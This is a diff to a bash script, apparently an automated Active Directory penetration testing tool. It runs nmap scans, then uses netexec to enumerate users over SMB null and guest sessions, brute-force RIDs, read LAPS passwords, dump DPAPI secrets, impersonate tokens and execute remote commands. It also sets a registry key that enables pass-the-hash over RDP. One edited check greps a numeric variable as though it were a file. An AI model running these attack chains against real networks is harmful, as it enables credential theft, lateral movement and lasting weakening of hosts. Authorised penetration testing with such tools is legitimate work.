@@ -204,7 +204,9 @@ nmap_fast () {
 		log "${SPACE}[📂] TCP ..."
 		#Si pas proxychains, sS pour TCP
 		#ports=$(nmap -p- --min-rate=1000 -T4 $target | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//); echo "nmap -p $ports -sT -sV -T4 -R $target"; nmap -p $ports -sT -sV -T4 -R $target
-		nmap -Pn $NMAP_HOSTS -sS -sV -T4 -oA $DIR/scan_nmap/scan_Fast_TCP --open --exclude $excluded_hosts >/dev/null 2>&1
+		nmap -Pn $NMAP_HOSTS -sS -T4 -oA $DIR/scan_nmap/scan_TCP_ports --open --exclude $excluded_hosts >/dev/null 2>&1
+		ports=$(grep -oP '^\d{1,5}/(tcp|udp)' $DIR/scan_nmap/scan_TCP_ports.nmap | awk -F'/' '{print $1}' | sort -u | paste -sd, -)
+		nmap -Pn $NMAP_HOSTS -sS -sV -T4 -p $ports -oA $DIR/scan_nmap/scan_Fast_TCP --open --exclude $excluded_hosts >/dev/null 2>&1
 		#log "${SPACE}[!] Nmap TCP report : ${DIR}/scan_nmap/scan_Fast_TCP.nmap"
 		log "${SPACE}[📂] UDP ..."
 		#UDP
@@ -289,16 +291,16 @@ nmap_fast () {
 				host_nmap="${BASH_REMATCH[1]}"
 			fi
 			
-			if [ -n "$FQDN" ] && [[ ! "$FQDN" =~ \.lan$ ]] && [[ "$FQDN" =~ ^[A-Z]+ ]]; then
+			if [ -n "$FQDN" ] && [[ ! "$FQDN" =~ \.lan$ ]] && [[ "$FQDN" =~ ^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$ ]]; then
 				echo "${ip}:${FQDN}" >> ${DIR}/hostname_file.txt
 				resolve="1"
 			elif [[ $ligne == "Nmap scan report for"* ]];then
 				netexec_port=""
-				if grep -q ${ip} "${DIR_PORTS}/445.txt";then
+				if grep -qs ${ip} "${DIR_PORTS}/445.txt";then
 					netexec_port="smb"
-				elif grep -q ${ip} "${DIR_PORTS}/3389.txt";then
+				elif grep -qs ${ip} "${DIR_PORTS}/3389.txt";then
 					netexec_port="rdp"
-				elif grep -q ${ip} "${DIR_PORTS}/5985.txt";then
+				elif grep -qs ${ip} "${DIR_PORTS}/5985.txt";then
 					netexec_port="winrm"
 				fi
 				if [ -n "$netexec_port" ]; then
@@ -667,8 +669,8 @@ nfs () {
 		log "[🔍] Check NFS"
 		NFS=$(cat $DIR_PORTS/2049.txt)
 		for ip in $NFS; do
-			$proxychains showmount -e $ip > /dev/null 2>&1
-			if [ $? -eq 0 ]; then
+			$proxychains showmount -e $ip < /dev/null > $DIR_VULNS/tmp_nfs.txt 2>/dev/null
+			if [ "$(wc -l < $DIR_VULNS/tmp_nfs.txt)" -gt 1 ]; then
 				green_log "${SPACE}[💀] NFS vulnerability detected on $ip"
 				blue_log "showmount -e ${ip}"
 			fi
@@ -692,6 +694,7 @@ vnc () {
 	fi
 }
 
+# < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_impersonate 2>/dev/null
 ###################### DNS ZONE TRANSFER  ##########################
 zt () {
 	log "[🔍] Trying zone transfer"
@@ -699,15 +702,16 @@ zt () {
 	domain=$(head -n 1 $DIR/hostname_file.txt | awk -F ":" '{print $2}' | cut -d '.' -f 2-)
 	NS=$($proxychains host -T -t ns $domain | awk -F"name server" '{print$2}')
 	NS_cleaned=$(echo "$NS" | while read -r line; do echo "${line:0: -1}"; done)
+	if [ ! -d $DNSPATH ];then
+		mkdir $DNSPATH
+	fi
 	for name_server in $NS_cleaned;
 	do
-		$proxychains host -T -t axfr $domain $name_server > $DNSPATH/$name_server.txt
-		if ! grep -q "; Transfer failed." $DNSPATH/$name_server.txt;then
-			if [ ! -d $DNSPATH ];then
-				mkdir $DNSPATH
-			fi
-			green_log "${SPACE}[💀] Zone transfer performed successfully for $name_server !"
-			blue_log "${SPACE} [+] Details to be retreived at $DNSPATH/$name_server.txt"
+		$proxychains host -T -t axfr $domain $name_server > $DNSPATH/$name_server.txt 2>/dev/null
+		if [[ -s "$DNSPATH/$name_server.txt" && $(grep -qE "; Transfer failed.|timed out" "$DNSPATH/$name_server.txt"; echo $?) -ne 0 ]]; then
+			
+			green_log "${SPACE}[💀] Zone transfer performed successfully for $name_server ! -> $DNSPATH/$name_server.txt"
+			blue_log "${SPACE} [+] $proxychains host -T -t axfr $domain $name_server"
 		fi
 	done
 }
@@ -839,7 +843,7 @@ ldap () {
 						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
 						host="$(echo $hostname | cut -d '.' -f 1)"
 					fi
-					$proxychains timeout $CME_TIMEOUT netexec smb $host -u $Username $cme_creds $kerberos -M $module < /dev/null > $DIR_VULNS/Enum_Device_${ip}_$module.txt 2>/dev/null
+					$proxychains timeout $CME_TIMEOUT netexec ldap $host -u $Username $cme_creds $kerberos -M $module < /dev/null > $DIR_VULNS/Enum_Device_${ip}_$module.txt 2>/dev/null
 				fi
 				if [[ "$module" == "laps" ]] && grep -Eqio "Password:" $DIR_VULNS/Enum_Device_${ip}_$module.txt;then
 					green_log "${SPACE}[💀] '$module' password(s) found from ${username} account ! -> $DIR_VULNS/Enum_Device_${ip}_$module.txt"
@@ -868,7 +872,6 @@ mssql () {
 		MSSQL=$(cat ${DIR_PORTS}/1443.txt)
 		for ip in $MSSQL; do
 			log "${SPACE}[📂] Check for $ip ($hostname) ..."
-			cat ${DIR_VULNS}/mssql/cme_${ip}_basic
 			$proxychains netexec --timeout $CME_TIMEOUT mssql $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/mssql/cme_${ip}_basic 2>/dev/null
 			if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/mssql/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/mssql/cme_${ip}_basic"; then
 				#If NTLM is not supported, restart with kerberos
@@ -907,12 +910,18 @@ smb () {
 				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -ai 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
 				## Injecter ces utilisateurs dans un fichier
-				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' >> ${DIR}/users_with_descriptions.txt
-				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+				
+				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
+						sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
+						awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
+						column -t -s ':' >> ${DIR}/users_with_descriptions.txt
+				cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
+						sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt				
 				## Supprimer les doublons
 				sort -u ${DIR}/users.txt -o ${DIR}/users.txt
 				sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
-				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute | grep -av '\[.\]' | awk -F'\\' '{print $2}' | wc -l)
+				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_null_session_users ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -av '\[.\]' | grep -v "\-BadPW\-" | \
+						awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  sed 's/.*\\//' | awk '{print $1}' | wc -l)
 				if [[ "$check_smb" -gt 0 ]]; then
 					green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
 				fi
@@ -929,12 +938,19 @@ smb () {
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute 2>/dev/null
 				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -ai 'SidTypeUser' | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u 'GuestUser' -p '' --users < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_guest_users 2>/dev/null
-				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' >> ${DIR}/users_with_descriptions.txt
-				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+				
+				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
+						sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
+						awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
+						column -t -s ':' >> ${DIR}/users_with_descriptions.txt
+				cat ${DIR_VULNS}/smb/cme_${ip}_guest_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
+						sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt				
+				
 				## Supprimer les doublons
 				sort -u ${DIR}/users.txt -o ${DIR}/users.txt
 				sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
-				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_guest_users ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute | grep -av '\[.\]' | awk -F'\\' '{print $2}' | wc -l)
+				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_guest_users ${DIR_VULNS}/smb/cme_${ip}_guest_users_rid_brute |grep -av '\[.\]' | grep -v "\-BadPW\-" | \
+						awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  sed 's/.*\\//' | awk '{print $1}' | wc -l)
 				if [[ "$check_smb" -gt 0 ]]; then
 					green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
 				fi
@@ -947,7 +963,7 @@ smb () {
 			# Can i connect with input user ?
 			if [[ "$Username" != "anonymous" ]]; then
 				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u $Username $cme_creds < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_basic_$Username 2>/dev/null
-				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/smb/cme_${ip}_basic" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/smb/cme_${ip}_basic_$Username"; then
+				if grep -Eqo "STATUS_NOT_SUPPORTED" "${DIR_VULNS}/smb/cme_${ip}_basic_$Username" || grep -Eqo "Failed to authenticate the user .* with ntlm" "${DIR_VULNS}/smb/cme_${ip}_basic_$Username"; then
 					#If NTLM is not supported, restart with kerberos
 					if [[ -n "$hostname" ]];then
 						kerberos="-d $(echo "$hostname" | cut -d '.' -f 2-) --kerberos"
@@ -960,7 +976,7 @@ smb () {
 				fi
 			fi
 			#Can we connect to at least one share ?
-			if grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_basic_$Username || grep -aq '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest || grep -aq 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
+			if grep -aqs '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_basic_$Username || grep -aqs '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_guest || grep -aqs 'SidTypeUser' ${DIR_VULNS}/smb/cme_${ip}_null_session; then
 				if [[ "$Username" != "anonymous" ]]; then
 					green_log "${SPACE}${SPACE}[💀] $Username is a valid username"
 				fi
@@ -969,7 +985,7 @@ smb () {
 				can_connect="0"
 			fi
 			#Are we machine's admin
-			if grep -aq '(Pwn3d!)' ${DIR_VULNS}/smb/cme_${ip}_basic_$Username; then
+			if grep -aqs '(Pwn3d!)' ${DIR_VULNS}/smb/cme_${ip}_basic_$Username; then
 				red_log "${SPACE}${SPACE}[💀] $Username have admin rights ! -> impacket-smbexec to exploit"
 				admin="1"
 			else
@@ -1006,14 +1022,11 @@ smb () {
 				
 				###### RETRIEVE USERS ######
 					#'< /dev/null' avoid netexec to break the loop, weird behavior ..
-				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_rid_brute 2>/dev/null
+				$proxychains netexec --timeout $CME_TIMEOUT smb $ip $cme_creds $kerberos --rid-brute 10000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_rid_brute 2>/dev/null
 				cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute |grep -i 'SidTypeUser' |grep -i 'SidTypeUser'| grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
 				check_smb=$(cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute | wc -l)
-				if [[ "$check_smb" -gt 4 ]]; then
+				if grep -qs "SidTypeUser" "$check_smb"; then
 					green_log "${SPACE}${SPACE}[💀] New users found (via RID_brute) -> ${DIR_VULNS}/smb/cme_${ip}_rid_brute"
-
-					## Injecter ces utilisateurs dans un fichier
-					cat ${DIR_VULNS}/smb/cme_${ip}_rid_brute | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
 					## Supprimer les doublons
 					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
 				fi
@@ -1024,8 +1037,12 @@ smb () {
 					green_log "${SPACE}${SPACE}[💀] New users found -> ${DIR}/users_with_descriptions.txt AND ${DIR}/users.txt"
 								
 					## Injecter ces utilisateurs dans un fichier
-					cat ${DIR_VULNS}/smb/cme_${ip}_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' >> ${DIR}/users_with_descriptions.txt
-					cat ${DIR_VULNS}/smb/cme_${ip}_users | grep -av '\[.\]' | awk -F'\\' '{print $2}' | cut -d " " -f 1 >> ${DIR}/users.txt
+					cat ${DIR_VULNS}/smb/cme_${ip}_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' | \
+							sed 's/.*\\//' |awk '{desc=""; for (i=4; i<=NF; i++) desc=desc " " $i; print $1 ":" desc}' | \
+							awk '{desc=""; for (i=3; i<=NF; i++) desc=desc " " $i; if ($2 ~ /^[0-9]+$/) print $1 ":" desc; else print $1 ": " $2 desc}'| \
+							column -t -s ':' >> ${DIR}/users_with_descriptions.txt
+					cat ${DIR_VULNS}/smb/cme_${ip}_users |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
+							sed 's/.*\\//' | awk '{print $1}' >> ${DIR}/users.txt
 					## Supprimer les doublons
 					sort -u ${DIR}/users.txt -o ${DIR}/users.txt
 					sort -u ${DIR}/users_with_descriptions.txt -o ${DIR}/users_with_descriptions.txt
@@ -1051,11 +1068,10 @@ smb () {
 					###### DUMP DPAPI ######
 					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos --dpapi < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_dpapi 2>/dev/null
 					check_smb=$(grep -oa 'Looting secrets' ${DIR_VULNS}/smb/cme_${ip}_dpapi | wc -l)
-					
-					if [ "$check_smb" -gt 0 ]; then
+
+					if [ "$check_smb" -gt 0 ] && ! grep -q "No secrets found" ${DIR_VULNS}/smb/cme_${ip}_dpapi; then
 						green_log "${SPACE}${SPACE}[💀] Success dump DPAPI -> ${DIR_VULNS}/smb/cme_${ip}_dpapi"
 					fi
-					
 					##### IMPERSONATE #####
 					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M impersonate < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_impersonate 2>/dev/null
 					check_smb=$(grep -ao '\[+\]' ${DIR_VULNS}/smb/cme_${ip}_impersonate | wc -l)
@@ -1064,7 +1080,6 @@ smb () {
 						green_log "${SPACE}${SPACE}[💀] Success impersonnate -> ${DIR_VULNS}/smb/cme_${ip}_impersonate"
 						blue_log "${SPACE}${SPACE} [+] Possibility to exploit via : $proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -M impersonate -o TOKEN=1 EXEC='whoami'"
 					fi
-					
 					
 					###### COMMAND EXECUTION ######
 					$proxychains netexec smb $host -u "$Username" $cme_creds $kerberos -x "whoami" < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_cmd 2>/dev/null
@@ -1147,7 +1162,7 @@ smb () {
 							red_log "${SPACE}[!] Pass-The-Hash already allowed for RDP ! -> Possible old compromission"
 							rm ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted
 						else
-							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'  < /dev/null 2>/dev/null
+							$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'  < /dev/null ${DIR_VULNS}/smb/cme_${ip}_cmd_rdp_restricted 2>/dev/null
 							orange_log "${SPACE}${SPACE}[💀] New possibility to Pass-The-Hash enabled on RDP -> Changement added in $DIR/modifs.txt"
 							echo -e "\nACTION :" >> $DIR/modifs.txt
 							echo "$proxychains netexec smb ${host} -u "$Username" $cme_creds $kerberos -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'" >> $DIR/modifs.txt
